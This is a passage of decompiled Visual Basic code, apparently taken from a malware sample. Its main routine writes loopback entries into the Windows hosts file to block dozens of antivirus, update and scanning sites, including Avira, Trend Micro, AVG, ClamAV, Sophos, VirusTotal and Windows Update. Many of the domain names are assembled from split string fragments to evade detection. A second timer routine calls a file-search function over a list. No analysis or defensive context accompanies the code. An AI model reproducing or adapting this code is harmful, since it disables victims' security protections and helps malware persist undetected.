  loc_004472D7: call var_88C4 = global_004010F0(global_004194A0, 00000001h, var_88C0)
  loc_004472E3: call var_88C8 = global_004011CC
  loc_004472FA: call var_88CC = global_00401044("fee.com", "127.0.0.1  la.mca")
  loc_00447305: call var_88D0 = global_004011AC
  loc_00447313: call var_88D4 = global_004010F0(global_004194A0, 00000001h, var_88D0)
  loc_0044731F: call var_88D8 = global_004011CC
  loc_00447336: call var_88DC = global_00401044("fee.com", "127.0.0.1  us.mca")
  loc_00447341: call var_88E0 = global_004011AC
  loc_0044734F: call var_88E4 = global_004010F0(global_004194A0, 00000001h, var_88E0)
  loc_0044735B: call var_88E8 = global_004011CC
  loc_00447372: call var_88EC = global_00401044("fee.com", "127.0.0.1  download.mca")
  loc_0044737D: call var_88F0 = global_004011AC
  loc_0044738B: call var_88F4 = global_004010F0(global_004194A0, 00000001h, var_88F0)
  loc_00447397: call var_88F8 = global_004011CC
  loc_004473AE: call var_88FC = global_00401044("fee.com", "127.0.0.1  dispatch.mca")
  loc_004473B9: call var_8900 = global_004011AC
  loc_004473C7: call var_8904 = global_004010F0(global_004194A0, 00000001h, var_8900)
  loc_004473D3: call var_8908 = global_004011CC
  loc_004473EA: call var_890C = global_00401044("fee.com", "127.0.0.1  mast.mca")
  loc_004473F5: call var_8910 = global_004011AC
  loc_00447403: call var_8914 = global_004010F0(global_004194A0, 00000001h, var_8910)
  loc_0044740F: call var_8918 = global_004011CC
  loc_00447426: call var_891C = global_00401044("fee.com", "127.0.0.1  www.mca")
  loc_00447431: call var_8920 = global_004011AC
  loc_0044743F: call var_8924 = global_004010F0(global_004194A0, 00000001h, var_8920)
  loc_0044744B: call var_8928 = global_004011CC
  loc_00447462: call var_892C = global_00401044("fee.com", "127.0.0.1  mca")
  loc_0044746D: call var_8930 = global_004011AC
  loc_0044747B: call var_8934 = global_004010F0(global_004194A0, 00000001h, var_8930)
  loc_00447487: call var_8938 = global_004011CC
  loc_004474A0: call var_893C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dlpro.avira.com")
  loc_004474BC: call var_8940 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl1.pro.antivir.de")
  loc_004474D8: call var_8944 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl2.pro.antivir.de")
  loc_004474F4: call var_8948 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl3.pro.antivir.de")
  loc_00447510: call var_894C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl1.antivir.net")
  loc_0044752C: call var_8950 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl2.antivir.net")
  loc_00447548: call var_8954 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl3.antivir.net")
  loc_00447564: call var_8958 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  dl2.antivir-pe.com")
  loc_0044757E: call var_895C = global_00401044("ee", "127.0.0.1  fr")
  loc_00447589: call var_8960 = global_004011AC
  loc_00447595: call var_8964 = global_00401044("av.net", var_8960)
  loc_004475A0: call var_8968 = global_004011AC
  loc_004475AE: call var_896C = global_004010F0(global_004194A0, 00000001h, var_8968)
  loc_004475C1: call var_8970 = global_00401150(00000002h, var_24, var_28)
  loc_004475DB: call var_8974 = global_00401044(global_00419A98, "127.0.0.1  a")
  loc_004475E6: call var_8978 = global_004011AC
  loc_004475F2: call var_897C = global_00401044("ga", var_8978)
  loc_004475FD: call var_8980 = global_004011AC
  loc_00447609: call var_8984 = global_00401044("te.net", var_8980)
  loc_00447614: call var_8988 = global_004011AC
  loc_00447622: call var_898C = global_004010F0(global_004194A0, 00000001h, var_8988)
  loc_00447639: call var_8990 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447653: call var_8994 = global_00401044("dm", "127.0.0.1  tren")
  loc_0044765E: call var_8998 = global_004011AC
  loc_0044766A: call var_899C = global_00401044("ic", var_8998)
  loc_00447675: call var_89A0 = global_004011AC
  loc_00447681: call var_89A4 = global_00401044("ro.com", var_89A0)
  loc_0044768C: call var_89A8 = global_004011AC
  loc_0044769A: call var_89AC = global_004010F0(global_004194A0, 00000001h, var_89A8)
  loc_004476B1: call var_89B0 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_004476CB: call var_89B4 = global_00401044("ndm", "127.0.0.1  www.tre")
  loc_004476D6: call var_89B8 = global_004011AC
  loc_004476E2: call var_89BC = global_00401044("ic", var_89B8)
  loc_004476ED: call var_89C0 = global_004011AC
  loc_004476F9: call var_89C4 = global_00401044("ro.com", var_89C0)
  loc_00447704: call var_89C8 = global_004011AC
  loc_00447712: call var_89CC = global_004010F0(global_004194A0, 00000001h, var_89C8)
  loc_00447729: call var_89D0 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447743: call var_89D4 = global_00401044("secall.trend", "127.0.0.1  hou")
  loc_0044774E: call var_89D8 = global_004011AC
  loc_0044775A: call var_89DC = global_00401044("micr", var_89D8)
  loc_00447765: call var_89E0 = global_004011AC
  loc_00447771: call var_89E4 = global_00401044("o.com", var_89E0)
  loc_0044777C: call var_89E8 = global_004011AC
  loc_0044778A: call var_89EC = global_004010F0(global_004194A0, 00000001h, var_89E8)
  loc_004477A1: call var_89F0 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_004477BB: call var_89F4 = global_00401044("endm", "127.0.0.1  es.tr")
  loc_004477C6: call var_89F8 = global_004011AC
  loc_004477D2: call var_89FC = global_00401044("icro.com", var_89F8)
  loc_004477DD: call var_8A00 = global_004011AC
  loc_004477EB: call var_8A04 = global_004010F0(global_004194A0, 00000001h, var_8A00)
  loc_004477FE: call var_8A08 = global_00401150(00000002h, var_24, var_28)
  loc_00447818: call var_8A0C = global_00401044("nd", "127.0.0.1  la.tre")
  loc_00447823: call var_8A10 = global_004011AC
  loc_0044782F: call var_8A14 = global_00401044("mic", var_8A10)
  loc_0044783A: call var_8A18 = global_004011AC
  loc_00447846: call var_8A1C = global_00401044("ro.com", var_8A18)
  loc_00447851: call var_8A20 = global_004011AC
  loc_0044785F: call var_8A24 = global_004010F0(global_004194A0, 00000001h, var_8A20)
  loc_00447876: call var_8A28 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447890: call var_8A2C = global_00401044("endse", "127.0.0.1  www.tr")
  loc_0044789B: call var_8A30 = global_004011AC
  loc_004478A7: call var_8A34 = global_00401044("cure.com", var_8A30)
  loc_004478B2: call var_8A38 = global_004011AC
  loc_004478C0: call var_8A3C = global_004010F0(global_004194A0, 00000001h, var_8A38)
  loc_004478D3: call var_8A40 = global_00401150(00000002h, var_24, var_28)
  loc_004478ED: call var_8A44 = global_00401044("ndse", "127.0.0.1  tre")
  loc_004478F8: call var_8A48 = global_004011AC
  loc_00447904: call var_8A4C = global_00401044("cure.com", var_8A48)
  loc_0044790F: call var_8A50 = global_004011AC
  loc_0044791D: call var_8A54 = global_004010F0(global_004194A0, 00000001h, var_8A50)
  loc_00447930: call var_8A58 = global_00401150(00000002h, var_24, var_28)
  loc_0044794C: call var_8A5C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  pandasoftware.com")
  loc_00447968: call var_8A60 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.pandasoftware.com")
  loc_00447984: call var_8A64 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.pandasecurity.com")
  loc_004479A0: call var_8A68 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  avg.com")
  loc_004479BC: call var_8A6C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  guru.avg.com")
  loc_004479D8: call var_8A70 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  free.avg.com")
  loc_004479F4: call var_8A74 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  update.avg.com")
  loc_00447A10: call var_8A78 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  free.grisoft.com")
  loc_00447A2C: call var_8A7C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.grisoft.com")
  loc_00447A48: call var_8A80 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  grisoft.com")
  loc_00447A64: call var_8A84 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  update.grisoft.cz")
  loc_00447A80: call var_8A88 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  backup.grisoft.cz")
  loc_00447A9C: call var_8A8C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  akamai.grisoft.cz")
  loc_00447AB8: call var_8A90 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  clamav.net")
  loc_00447AD4: call var_8A94 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.clamav.net")
  loc_00447AF0: call var_8A98 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  w32.clamav.net")
  loc_00447B0C: call var_8A9C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  free-av.com")
  loc_00447B28: call var_8AA0 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.free-av.com")
  loc_00447B44: call var_8AA4 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.avast.com")
  loc_00447B5E: call var_8AA8 = global_00401044("st.c", "127.0.0.1  ava")
  loc_00447B69: call var_8AAC = global_004011AC
  loc_00447B75: call var_8AB0 = global_00401044("om", var_8AAC)
  loc_00447B80: call var_8AB4 = global_004011AC
  loc_00447B8E: call var_8AB8 = global_004010F0(global_004194A0, 00000001h, var_8AB4)
  loc_00447BA1: call var_8ABC = global_00401150(00000002h, var_24, var_28)
  loc_00447BBB: call var_8AC0 = global_00401044("rt.org", "127.0.0.1  ce")
  loc_00447BC6: call var_8AC4 = global_004011AC
  loc_00447BD4: call var_8AC8 = global_004010F0(global_004194A0, 00000001h, var_8AC4)
  loc_00447BE0: call var_8ACC = global_004011CC
  loc_00447BF7: call var_8AD0 = global_00401044("rt.org", "127.0.0.1  www.ce")
  loc_00447C02: call var_8AD4 = global_004011AC
  loc_00447C10: call var_8AD8 = global_004010F0(global_004194A0, 00000001h, var_8AD4)
  loc_00447C1C: call var_8ADC = global_004011CC
  loc_00447C33: call var_8AE0 = global_00401044("date.micr", "127.0.0.1  up")
  loc_00447C3E: call var_8AE4 = global_004011AC
  loc_00447C4A: call var_8AE8 = global_00401044("os", var_8AE4)
  loc_00447C55: call var_8AEC = global_004011AC
  loc_00447C61: call var_8AF0 = global_00401044("oft.com", var_8AEC)
  loc_00447C6C: call var_8AF4 = global_004011AC
  loc_00447C7A: call var_8AF8 = global_004010F0(global_004194A0, 00000001h, var_8AF4)
  loc_00447C91: call var_8AFC = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447CAB: call var_8B00 = global_00401044("dowsup", "127.0.0.1  win")
  loc_00447CB6: call var_8B04 = global_004011AC
  loc_00447CC2: call var_8B08 = global_00401044("date.mi", var_8B04)
  loc_00447CCD: call var_8B0C = global_004011AC
  loc_00447CD9: call var_8B10 = global_00401044("cro", var_8B0C)
  loc_00447CE4: call var_8B14 = global_004011AC
  loc_00447CF0: call var_8B18 = global_00401044("soft.com", var_8B14)
  loc_00447CFB: call var_8B1C = global_004011AC
  loc_00447D09: call var_8B20 = global_004010F0(global_004194A0, 00000001h, var_8B1C)
  loc_00447D24: call var_8B24 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_00447D3E: call var_8B28 = global_00401044("ros", "127.0.0.1  www.mic")
  loc_00447D49: call var_8B2C = global_004011AC
  loc_00447D55: call var_8B30 = global_00401044("oft.com", var_8B2C)
  loc_00447D60: call var_8B34 = global_004011AC
  loc_00447D6E: call var_8B38 = global_004010F0(global_004194A0, 00000001h, var_8B34)
  loc_00447D81: call var_8B3C = global_00401150(00000002h, var_24, var_28)
  loc_00447D9B: call var_8B40 = global_00401044("cros", "127.0.0.1  mi")
  loc_00447DA6: call var_8B44 = global_004011AC
  loc_00447DB2: call var_8B48 = global_00401044("oft.com", var_8B44)
  loc_00447DBD: call var_8B4C = global_004011AC
  loc_00447DCB: call var_8B50 = global_004010F0(global_004194A0, 00000001h, var_8B4C)
  loc_00447DDE: call var_8B54 = global_00401150(00000002h, var_24, var_28)
  loc_00447DF8: call var_8B58 = global_00401044("etwor", "127.0.0.1  www.n")
  loc_00447E03: call var_8B5C = global_004011AC
  loc_00447E0F: call var_8B60 = global_00401044("kasso", var_8B5C)
  loc_00447E1A: call var_8B64 = global_004011AC
  loc_00447E26: call var_8B68 = global_00401044("ciates.com", var_8B64)
  loc_00447E31: call var_8B6C = global_004011AC
  loc_00447E3F: call var_8B70 = global_004010F0(global_004194A0, 00000001h, var_8B6C)
  loc_00447E56: call var_8B74 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447E70: call var_8B78 = global_00401044("etwor", "127.0.0.1 n")
  loc_00447E7B: call var_8B7C = global_004011AC
  loc_00447E87: call var_8B80 = global_00401044("kasso", var_8B7C)
  loc_00447E92: call var_8B84 = global_004011AC
  loc_00447E9E: call var_8B88 = global_00401044("ciates.com", var_8B84)
  loc_00447EA9: call var_8B8C = global_004011AC
  loc_00447EB7: call var_8B90 = global_004010F0(global_004194A0, 00000001h, var_8B8C)
  loc_00447ECE: call var_8B94 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447EE8: call var_8B98 = global_00401044("a.com", "127.0.0.1  www.c")
  loc_00447EF3: call var_8B9C = global_004011AC
  loc_00447F01: call var_8BA0 = global_004010F0(global_004194A0, 00000001h, var_8B9C)
  loc_00447F0D: call var_8BA4 = global_004011CC
  loc_00447F24: call var_8BA8 = global_00401044("a.com", "127.0.0.1  c")
  loc_00447F2F: call var_8BAC = global_004011AC
  loc_00447F3D: call var_8BB0 = global_004010F0(global_004194A0, 00000001h, var_8BAC)
  loc_00447F49: call var_8BB4 = global_004011CC
  loc_00447F60: call var_8BB8 = global_00401044("rc.com", "127.0.0.1  sa")
  loc_00447F6B: call var_8BBC = global_004011AC
  loc_00447F79: call var_8BC0 = global_004010F0(global_004194A0, 00000001h, var_8BBC)
  loc_00447F85: call var_8BC4 = global_004011CC
  loc_00447F9C: call var_8BC8 = global_00401044("rc.com", "127.0.0.1  www.sa")
  loc_00447FA7: call var_8BCC = global_004011AC
  loc_00447FB5: call var_8BD0 = global_004010F0(global_004194A0, 00000001h, var_8BCC)
  loc_00447FC1: call var_8BD4 = global_004011CC
  loc_00447FD8: call var_8BD8 = global_00401044("oph", "127.0.0.1  www.s")
  loc_00447FE3: call var_8BDC = global_004011AC
  loc_00447FEF: call var_8BE0 = global_00401044("os.com", var_8BDC)
  loc_00447FFA: call var_8BE4 = global_004011AC
  loc_00448008: call var_8BE8 = global_004010F0(global_004194A0, 00000001h, var_8BE4)
  loc_0044801B: call var_8BEC = global_00401150(00000002h, var_24, var_28)
  loc_00448035: call var_8BF0 = global_00401044("oph", "127.0.0.1  s")
  loc_00448040: call var_8BF4 = global_004011AC
  loc_0044804C: call var_8BF8 = global_00401044("os.com", var_8BF4)
  loc_00448057: call var_8BFC = global_004011AC
  loc_00448065: call var_8C00 = global_004010F0(global_004194A0, 00000001h, var_8BFC)
  loc_00448078: call var_8C04 = global_00401150(00000002h, var_24, var_28)
  loc_00448092: call var_8C08 = global_00401044("usli", "127.0.0.1  www.vir")
  loc_0044809D: call var_8C0C = global_004011AC
  loc_004480A9: call var_8C10 = global_00401044("st.com", var_8C0C)
  loc_004480B4: call var_8C14 = global_004011AC
  loc_004480C2: call var_8C18 = global_004010F0(global_004194A0, 00000001h, var_8C14)
  loc_004480D5: call var_8C1C = global_00401150(00000002h, var_24, var_28)
  loc_004480EF: call var_8C20 = global_00401044("usl", "127.0.0.1  vir")
  loc_004480FA: call var_8C24 = global_004011AC
  loc_00448106: call var_8C28 = global_00401044("ist.com", var_8C24)
  loc_00448111: call var_8C2C = global_004011AC
  loc_0044811F: call var_8C30 = global_004010F0(global_004194A0, 00000001h, var_8C2C)
  loc_00448132: call var_8C34 = global_00401150(00000002h, var_24, var_28)
  loc_0044814C: call var_8C38 = global_00401044("re.com", "127.0.0.1  f-secu")
  loc_00448157: call var_8C3C = global_004011AC
  loc_00448165: call var_8C40 = global_004010F0(global_004194A0, 00000001h, var_8C3C)
  loc_00448171: call var_8C44 = global_004011CC
  loc_00448188: call var_8C48 = global_00401044("cu", "127.0.0.1  www.f-se")
  loc_00448193: call var_8C4C = global_004011AC
  loc_0044819F: call var_8C50 = global_00401044("re.com", var_8C4C)
  loc_004481AA: call var_8C54 = global_004011AC
  loc_004481B8: call var_8C58 = global_004010F0(global_004194A0, 00000001h, var_8C54)
  loc_004481CB: call var_8C5C = global_00401150(00000002h, var_24, var_28)
  loc_004481E5: call var_8C60 = global_00401044("ot.com", "127.0.0.1  f-pr")
  loc_004481F0: call var_8C64 = global_004011AC
  loc_004481FE: call var_8C68 = global_004010F0(global_004194A0, 00000001h, var_8C64)
  loc_0044820A: call var_8C6C = global_004011CC
  loc_00448221: call var_8C70 = global_00401044("ot.com", "127.0.0.1  www.f-pr")
  loc_0044822C: call var_8C74 = global_004011AC
  loc_0044823A: call var_8C78 = global_004010F0(global_004194A0, 00000001h, var_8C74)
  loc_00448246: call var_8C7C = global_004011CC
  loc_0044825D: call var_8C80 = global_00401044("ust", "127.0.0.1  www.vir")
  loc_00448268: call var_8C84 = global_004011AC
  loc_00448274: call var_8C88 = global_00401044("otal.com", var_8C84)
  loc_0044827F: call var_8C8C = global_004011AC
  loc_0044828D: call var_8C90 = global_004010F0(global_004194A0, 00000001h, var_8C8C)
  loc_004482A0: call var_8C94 = global_00401150(00000002h, var_24, var_28)
  loc_004482BA: call var_8C98 = global_00401044("ust", "127.0.0.1  vir")
  loc_004482C5: call var_8C9C = global_004011AC
  loc_004482D1: call var_8CA0 = global_00401044("otal.com", var_8C9C)
  loc_004482DC: call var_8CA4 = global_004011AC
  loc_004482EA: call var_8CA8 = global_004010F0(global_004194A0, 00000001h, var_8CA4)
  loc_004482FD: call var_8CAC = global_00401150(00000002h, var_24, var_28)
  loc_00448317: call var_8CB0 = global_00401044("ust", "127.0.0.1  scanner.vir")
  loc_00448322: call var_8CB4 = global_004011AC
  loc_0044832E: call var_8CB8 = global_00401044("otal.com", var_8CB4)
  loc_00448339: call var_8CBC = global_004011AC
  loc_00448347: call var_8CC0 = global_004010F0(global_004194A0, 00000001h, var_8CBC)
  loc_0044835A: call var_8CC4 = global_00401150(00000002h, var_24, var_28)
  loc_00448374: call var_8CC8 = global_00401044("ussc", "127.0.0.1  vir")
  loc_0044837F: call var_8CCC = global_004011AC
  loc_0044838B: call var_8CD0 = global_00401044("an.jo", var_8CCC)
  loc_00448396: call var_8CD4 = global_004011AC
  loc_004483A2: call var_8CD8 = global_00401044("tti.org", var_8CD4)
  loc_004483AD: call var_8CDC = global_004011AC
  loc_004483BB: call var_8CE0 = global_004010F0(global_004194A0, 00000001h, var_8CDC)
  loc_004483D2: call var_8CE4 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_004483EE: call var_8CE8 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  jotti.org")
  loc_00448408: call var_8CEC = global_00401044("rusth", "127.0.0.1  novi")
  loc_00448413: call var_8CF0 = global_004011AC
  loc_0044841F: call var_8CF4 = global_00401044("anks.org", var_8CF0)
  loc_0044842A: call var_8CF8 = global_004011AC
  loc_00448438: call var_8CFC = global_004010F0(global_004194A0, 00000001h, var_8CF8)
  loc_0044844B: call var_8D00 = global_00401150(00000002h, var_24, var_28)
  loc_00448465: call var_8D04 = global_00401044("rustha", "127.0.0.1  www.novi")
  loc_00448470: call var_8D08 = global_004011AC
  loc_0044847C: call var_8D0C = global_00401044("nks.org", var_8D08)
  loc_00448487: call var_8D10 = global_004011AC
  loc_00448495: call var_8D14 = global_004010F0(global_004194A0, 00000001h, var_8D10)
  loc_004484A8: call var_8D18 = global_00401150(00000002h, var_24, var_28)
  loc_004484C2: call var_8D1C = global_00401044("ann", "127.0.0.1  sc")
  loc_004484CD: call var_8D20 = global_004011AC
  loc_004484D9: call var_8D24 = global_00401044("er.no", var_8D20)
  loc_004484E4: call var_8D28 = global_004011AC
  loc_004484F0: call var_8D2C = global_00401044("viru", var_8D28)
  loc_004484FB: call var_8D30 = global_004011AC
  loc_00448507: call var_8D34 = global_00401044("sthanks.org", var_8D30)
  loc_00448512: call var_8D38 = global_004011AC
  loc_00448520: call var_8D3C = global_004010F0(global_004194A0, 00000001h, var_8D38)
  loc_0044853B: call var_8D40 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_0044854D: call var_8D44 = global_004010A0(00000001h)
  loc_00448561: call var_8D48 = global_004011D0("C:\WINDOWS\system32\drivers\etc\hosts", 00000006h)
  loc_00448582: call var_8D4C = global_00401078(var_50, Form1.Timer2)
  loc_00448588: var_64 = var_8D4C
  loc_00448596: var_64.UnkVCall_0000005Ch
  loc_0044859B: var_68 = var_64.UnkVCall_0000005Ch
  loc_004485A2: If var_68 < 0 Then
  loc_004485B3:   call var_8D50 = global_00401058(var_68, var_64, global_0041925C, 0000005Ch, var_64, 00000000h)
  loc_004485B9:   var_80 = var_8D50
  loc_004485BE: Else
  loc_004485C5: End If
  loc_004485C8: call var_8D54 = global_004011D4
  loc_004485DA: GoTo loc_0044861D
  loc_0044860A: call var_8D58 = global_00401150(0000000Bh, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, global_0044861E)
  loc_00448616: call var_8D5C = global_004011D4
  loc_0044861C: Exit Sub
  loc_0044861D: ' Referenced from: 004485DA
End Sub

Private Sub Timer11_Timer() '444770
  loc_00444776: ext_4010EC
  loc_0044478E: ext_40109C
  loc_004447D5: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_004447F6: call var_8008 = global_00401078(var_34, Form1.List1)
  loc_004447FC: var_44 = var_8008
  loc_0044480C: var_3C = var_44.UnkVCall_000000E0h
  loc_00444814: var_48 = var_3C
  loc_0044481B: If var_48 < 0 Then
  loc_0044482F:   call var_800C = global_00401058(var_48, var_44, global_00418DC4, 000000E0h)
  loc_00444835:   var_74 = var_800C
  loc_0044483A: Else
  loc_00444841: End If
  loc_00444855: call var_8010 = global_00401078(var_38, Form1.List1)
  loc_0044485B: var_4C = var_8010
  loc_00444873: var_50 = var_4C.UnkVCall_000000D8h
  loc_0044487A: If var_50 < 0 Then
  loc_0044488E:   call var_8014 = global_00401058(var_50, var_4C, global_00418DC4, 000000D8h)
  loc_00444894:   var_78 = var_8014
  loc_00444899: Else
  loc_004448A0: End If
  loc_004448C7: call var_8018 = global_0040102C(00000002h, var_34, var_38)
  loc_004448D6: If (var_3C = 0) Then
  loc_004448F7:   call var_801C = global_00401078(var_34, Form1.List1)
  loc_004448FD:   var_44 = var_801C
  loc_0044490D:   var_24 = var_44.UnkVCall_000000F8h
  loc_00444915:   var_48 = var_24
  loc_0044491C:   If var_48 < 0 Then
  loc_00444930:     call var_8020 = global_00401058(var_48, var_44, global_00418DC4, 000000F8h)
  loc_00444936:     var_7C = var_8020
  loc_0044493B:   Else
  loc_00444942:   End If
  loc_0044494A:   call var_8024 = global_00401148
  loc_00444958:   call var_8028 = global_00401148
  loc_00444961:   var_6C = var_24
  loc_00444971:   call var_802C = global_004011AC
  loc_00444992:   var_4C = Form1.FindFiles(var_28, var_2C, var_30)
  loc_00444999:   If var_4C < 0 Then
  loc_004449AD:     call var_8034 = global_00401058(var_4C, Me, global_00418934, 000006F8h)
  loc_004449B3:     var_80 = var_8034
  loc_004449B8:   Else
  loc_004449BF:   End If
  loc_004449CD:   call var_8038 = global_00401150(00000003h, var_28, var_2C, var_30)
  loc_004449D9:   call var_803C = global_004011D4
  loc_004449FA:   call var_8040 = global_00401078(var_34, Form1.List1)
  loc_00444A00:   var_44 = var_8040
  loc_00444A0E:   var_44.UnkVCall_000000E4h
  loc_00444A16:   var_48 = var_44.UnkVCall_000000E4h
  loc_00444A1D:   If var_48 < 0 Then
  loc_00444A31:     call var_8044 = global_00401058(var_48, var_44, global_00418DC4, 000000E4h, var_44, 00000000h)
  loc_00444A37:     var_84 = var_8044
  loc_00444A3F:   Else
  loc_00444A49:   End If
  loc_00444A4C:   call var_8048 = global_004011D4
  loc_00444A6D:   call var_804C = global_00401078(var_34, Form1.Timer10)
  loc_00444A73:   var_44 = var_804C
  loc_00444A81:   var_44.UnkVCall_0000005Ch
  loc_00444A86:   var_48 = var_44.UnkVCall_0000005Ch
  loc_00444A8D:   If var_48 < 0 Then
  loc_00444A9E:     call var_8050 = global_00401058(var_48, var_44, global_0041925C, 0000005Ch, var_44, FFFFFFFFh)
  loc_00444AA4:     var_88 = var_8050
  loc_00444AAC:   Else
  loc_00444AB6:   End If
  loc_00444AB9:   call var_8054 = global_004011D4
  loc_00444ADA:   call var_8058 = global_00401078(var_34, Form1.Timer11)
  loc_00444AE0:   var_44 = var_8058
  loc_00444AEE:   var_44.UnkVCall_0000005Ch
  loc_00444AF3:   var_48 = var_44.UnkVCall_0000005Ch
  loc_00444AFA:   If var_48 < 0 Then
  loc_00444B0B:     call var_805C = global_00401058(var_48, var_44, global_0041925C, 0000005Ch, var_44, 00000000h)
  loc_00444B11:     var_8C = var_805C
  loc_00444B19:   Else
  loc_00444B23:   End If
  loc_00444B26:   call var_8060 = global_004011D4
  loc_00444B31: Else
  loc_00444B4C:   call var_8064 = global_00401078(var_34, Form1.List4)
  loc_00444B52:   var_44 = var_8064
  loc_00444B5E:   var_44.UnkVCall_000001E8h
  loc_00444B66:   var_48 = var_44.UnkVCall_000001E8h
  loc_00444B6D:   If var_48 < 0 Then
  loc_00444B81:     call var_8068 = global_00401058(var_48, var_44, global_00418DC4, 000001E8h, var_44)
  loc_00444B87:     var_90 = var_8068
  loc_00444B8F:   Else
  loc_00444B99:   End If
  loc_00444B9C:   call var_806C = global_004011D4
  loc_00444BBD:   call var_8070 = global_00401078(var_38, Form1.List1)
  loc_00444BC3:   var_4C = var_8070
  loc_00444BDA:   call var_8074 = global_00401078(var_34, Form1.List1)
  loc_00444BE0:   var_44 = var_8074
  loc_00444BF0:   var_3C = var_44.UnkVCall_000000E0h
  loc_00444BF8:   var_48 = var_3C
  loc_00444BFF:   If var_48 < 0 Then
  loc_00444C13:     call var_8078 = global_00401058(var_48, var_44, global_00418DC4, 000000E0h)
  loc_00444C19:     var_94 = var_8078
  loc_00444C21:   Else
  loc_00444C2B:   End If
  loc_00444C43:   var_3C(1) = var_4C.UnkVCall_000000E4h
  loc_00444C4B:   var_50 = var_4C
  loc_00444C52:   If var_50 < 0 Then
  loc_00444C66:     call var_807C = global_00401058(var_50, var_4C, global_00418DC4, 000000E4h)
  loc_00444C6C:     var_98 = var_807C
  loc_00444C74:   Else
  loc_00444C7E:   End If
  loc_00444C88:   call var_8080 = global_0040102C(00000002h, var_34, var_38)
  loc_00444CAC:   call var_8084 = global_00401078(var_34, Form1.List1)
  loc_00444CB2:   var_44 = var_8084
  loc_00444CC2:   var_24 = var_44.UnkVCall_000000F8h
  loc_00444CCA:   var_48 = var_24
  loc_00444CD1:   If var_48 < 0 Then
  loc_00444CE5:     call var_8088 = global_00401058(var_48, var_44, global_00418DC4, 000000F8h)
  loc_00444CEB:     var_9C = var_8088
  loc_00444CF3:   Else
  loc_00444CFD:   End If
  loc_00444D05:   call var_808C = global_00401148
  loc_00444D13:   call var_8090 = global_00401148
  loc_00444D1C:   var_70 = var_24
  loc_00444D2C:   call var_8094 = global_004011AC
  loc_00444D4D:   var_4C = Form1.FindFiles(var_28, var_2C, var_30)
  loc_00444D54:   If var_4C < 0 Then
  loc_00444D68:     call var_809C = global_00401058(var_4C, Me, global_00418934, 000006F8h)
  loc_00444D6E:     var_A0 = var_809C
  loc_00444D76:   Else
  loc_00444D80:   End If
  loc_00444D8E:   call var_80A0 = global_00401150(00000003h, var_28, var_2C, var_30)
  loc_00444D9A:   call var_80A4 = global_004011D4
  loc_00444DBB:   call var_80A8 = global_00401078(var_34, Form1.List4)
  loc_00444DC1:   var_44 = var_80A8
  loc_00444DCF:   var_44.UnkVCall_000000E4h
  loc_00444DD7:   var_48 = var_44.UnkVCall_000000E4h
  loc_00444DDE:   If var_48 < 0 Then
  loc_00444DF2:     call var_80AC = global_00401058(var_48, var_44, global_00418DC4, 000000E4h, var_44, 00000000h)
  loc_00444DF8:     var_A4 = var_80AC
  loc_00444E00:   Else
  loc_00444E0A:   End If
  loc_00444E0D:   call var_80B0 = global_004011D4
  loc_00444E2E:   call var_80B4 = global_00401078(var_34, Form1.Timer10)
  loc_00444E34:   var_44 = var_80B4
  loc_00444E42:   var_44.UnkVCall_0000005Ch
  loc_00444E47:   var_48 = var_44.UnkVCall_0000005Ch
  loc_00444E4E:   If var_48 < 0 Then
  loc_00444E5F:     call var_80B8 = global_00401058(var_48, var_44, global_0041925C, 0000005Ch, var_44, FFFFFFFFh)
  loc_00444E65:     var_A8 = var_80B8
  loc_00444E6D:   Else
  loc_00444E77:   End If
  loc_00444E7A:   call var_80BC = global_004011D4
  loc_00444E9B:   call var_80C0 = global_00401078(var_34, Form1.Timer11)
  loc_00444EA1:   var_44 = var_80C0
  loc_00444EAF:   var_44.UnkVCall_0000005Ch
  loc_00444EB4:   var_48 = var_44.UnkVCall_0000005Ch
  loc_00444EBB:   If var_48 < 0 Then
  loc_00444ECC:     call var_80C4 = global_00401058(var_48, var_44, global_0041925C, 0000005Ch, var_44, 00000000h)
  loc_00444ED2:     var_AC = var_80C4
  loc_00444EDA:   Else
  loc_00444EE4:   End If
  loc_00444EE7:   call var_80C8 = global_004011D4
  loc_00444EED: End If
  loc_00444EF9: GoTo loc_00444F2A
  loc_00444F0D: call var_80CC = global_00401150(00000004h, var_24, var_28, var_2C, var_30, global_00444F2B)
